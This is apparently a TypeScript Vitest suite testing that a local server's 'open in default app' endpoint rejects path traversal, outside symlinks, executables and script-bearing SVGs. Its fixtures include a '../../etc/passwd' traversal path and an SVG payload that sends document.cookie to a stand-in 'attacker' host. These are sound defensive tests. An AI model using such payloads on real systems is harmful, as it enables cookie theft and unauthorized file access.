import { mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { RunStore } from '../runs/store.js';
import type { RunManager } from '../workflows/run.js';
import { createApp, type ServerDeps } from './server.js';

/**
 * `POST /api/runs/:id/open-in` with `target: 'default'` (#365): the diff pane's "open in OS
 * default app" action for one worktree file. Must (a) 409 in hosted mode before ever touching
 * the filesystem, (b) reject any path that doesn't resolve inside the run's own worktree, and
 * (c) actually launch the OS opener only for a real in-worktree file — `openFileInDefaultApp`
 * is mocked so the suite never actually spawns a real GUI app.
 */
vi.mock('./open-in-app.js', async (importOriginal) => {
  const actual = await importOriginal<typeof import('./open-in-app.js')>();
  return { ...actual, openFileInDefaultApp: vi.fn().mockResolvedValue(true) };
});

import { openFileInDefaultApp } from './open-in-app.js';
import { apiRequest } from './loopback-request.testkit.js';

describe("POST /api/runs/:id/open-in — target 'default' (local-mode file open, #365)", () => {
  let repoRoot: string;
  let store: RunStore;
  let runId: string;
  let worktree: string;
  const savedRemote = process.env.CEZ_REMOTE;

  beforeEach(() => {
    vi.clearAllMocks();
    repoRoot = mkdtempSync(join(tmpdir(), 'cez-openfile-'));
    worktree = mkdtempSync(join(tmpdir(), 'cez-openfile-wt-'));
    writeFileSync(join(worktree, 'logo.png'), Buffer.from([0x89, 0x50, 0x4e, 0x47]));
    mkdirSync(join(worktree, 'sub'), { recursive: true });
    writeFileSync(join(worktree, 'sub', 'nested.png'), Buffer.from([0x89, 0x50, 0x4e, 0x47]));
    store = RunStore.open(join(repoRoot, '.ai/cezar'));
    runId = store.createRun({ title: 't', workflow: 'quick-task', task: 'do it', steps: [] }).id;
    store.updateRun(runId, { worktreePath: worktree });
    delete process.env.CEZ_REMOTE;
  });

  afterEach(() => {
    store.flush();
    rmSync(repoRoot, { recursive: true, force: true });
    rmSync(worktree, { recursive: true, force: true });
    if (savedRemote === undefined) delete process.env.CEZ_REMOTE;
    else process.env.CEZ_REMOTE = savedRemote;
  });

  const post = (body: unknown, over: Partial<ServerDeps> = {}) =>
    apiRequest(
      createApp({ repoRoot, store, manager: {} as RunManager, version: '0.0.0-test', ...over }),
      `/api/runs/${runId}/open-in`,
      { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) },
    );

  it('409s in hosted mode (CEZ_REMOTE=1) before any filesystem/open-in-app call', async () => {
    process.env.CEZ_REMOTE = '1';
    const res = await post({ target: 'default', path: 'logo.png' });
    expect(res.status).toBe(409);
    expect(((await res.json()) as { error: string }).error).toContain('hosted mode');
    expect(openFileInDefaultApp).not.toHaveBeenCalled();
  });

  it('409s the same way on a non-loopback bind host', async () => {
    const res = await post({ target: 'default', path: 'logo.png' }, { bindHost: '10.0.0.5' });
    expect(res.status).toBe(409);
    expect(openFileInDefaultApp).not.toHaveBeenCalled();
  });

  it('opens a real in-worktree file and answers its absolute path', async () => {
    const res = await post({ target: 'default', path: 'sub/nested.png' });
    expect(res.status).toBe(200);
    const body = (await res.json()) as { opened: boolean; path: string };
    expect(body.opened).toBe(true);
    expect(body.path).toBe(join(worktree, 'sub', 'nested.png'));
    expect(openFileInDefaultApp).toHaveBeenCalledWith(join(worktree, 'sub', 'nested.png'));
  });

  it('rejects a path that escapes the worktree (traversal) with a 409, never opening anything', async () => {
    const res = await post({ target: 'default', path: '../../etc/passwd' });
    expect(res.status).toBe(409);
    expect(((await res.json()) as { error: string }).error).toContain('escapes the worktree');
    expect(openFileInDefaultApp).not.toHaveBeenCalled();
  });

  it('rejects an absolute path outside the worktree', async () => {
    const outside = mkdtempSync(join(tmpdir(), 'cez-openfile-outside-'));
    try {
      writeFileSync(join(outside, 'secret.png'), 'x');
      const res = await post({ target: 'default', path: join(outside, 'secret.png') });
      expect(res.status).toBe(409);
      expect(openFileInDefaultApp).not.toHaveBeenCalled();
    } finally {
      rmSync(outside, { recursive: true, force: true });
    }
  });

  it('rejects a symlink pointing outside the worktree', async () => {
    const outside = mkdtempSync(join(tmpdir(), 'cez-openfile-link-'));
    try {
      writeFileSync(join(outside, 'real.png'), 'x');
      symlinkSync(join(outside, 'real.png'), join(worktree, 'link.png'));
      const res = await post({ target: 'default', path: 'link.png' });
      expect(res.status).toBe(409);
      expect(openFileInDefaultApp).not.toHaveBeenCalled();
    } finally {
      rmSync(outside, { recursive: true, force: true });
    }
  });

  it('rejects a directory path — "default" only opens files', async () => {
    const res = await post({ target: 'default', path: 'sub' });
    expect(res.status).toBe(409);
    expect(((await res.json()) as { error: string }).error).toContain('not a file');
    expect(openFileInDefaultApp).not.toHaveBeenCalled();
  });

  it('refuses a non-image file — the OS launcher would EXECUTE a .command/.desktop/.exe', async () => {
    writeFileSync(join(worktree, 'build.command'), '#!/bin/sh\necho pwned\n', { mode: 0o755 });
    const res = await post({ target: 'default', path: 'build.command' });
    expect(res.status).toBe(409);
    expect(((await res.json()) as { error: string }).error).toContain('limited to images');
    expect(openFileInDefaultApp).not.toHaveBeenCalled();
  });

  it('refuses an SVG — the OS default handler would run its <script>, with no CSP to stop it', async () => {
    // Reachable in practice: a repo's own `.gitattributes` (`*.svg binary`) makes numstat report
    // the SVG binary, which flips `shouldPreviewImage` on and renders the "Open in default app"
    // button for it. The raw route may still serve this file (inert <img> + no-script CSP) —
    // this route may not, because handing it to the OS applies neither mitigation.
    writeFileSync(
      join(worktree, 'evil.svg'),
      '<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("http://attacker/"+document.cookie)</script></svg>',
    );
    const res = await post({ target: 'default', path: 'evil.svg' });
    expect(res.status).toBe(409);
    // The refusal names the actual rule — an SVG is an image, so "limited to images" would lie.
    expect(((await res.json()) as { error: string }).error).toContain('SVG can carry scripts');
    expect(openFileInDefaultApp).not.toHaveBeenCalled();
  });

  it('refuses an ordinary text file in the worktree just the same', async () => {
    writeFileSync(join(worktree, 'notes.txt'), 'hello');
    const res = await post({ target: 'default', path: 'notes.txt' });
    expect(res.status).toBe(409);
    expect(openFileInDefaultApp).not.toHaveBeenCalled();
  });

  it('rejects an over-long path at the schema boundary', async () => {
    const res = await post({ target: 'default', path: `${'a/'.repeat(600)}logo.png` });
    expect(res.status).toBe(400);
    expect(openFileInDefaultApp).not.toHaveBeenCalled();
  });

  it('requires a path for the default target', async () => {
    const res = await post({ target: 'default' });
    expect(res.status).toBe(400);
    expect(openFileInDefaultApp).not.toHaveBeenCalled();
  });

  it('404s for an unknown run before any gate', async () => {
    const app = createApp({ repoRoot, store, manager: {} as RunManager, version: '0.0.0-test' });
    const res = await apiRequest(app, '/api/runs/nope/open-in', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ target: 'default', path: 'logo.png' }),
    });
    expect(res.status).toBe(404);
  });

  it('409s honestly when the app failed to launch', async () => {
    vi.mocked(openFileInDefaultApp).mockResolvedValueOnce(false);
    const res = await post({ target: 'default', path: 'logo.png' });
    expect(res.status).toBe(409);
    expect(((await res.json()) as { error: string }).error).toContain('could not open');
  });
});
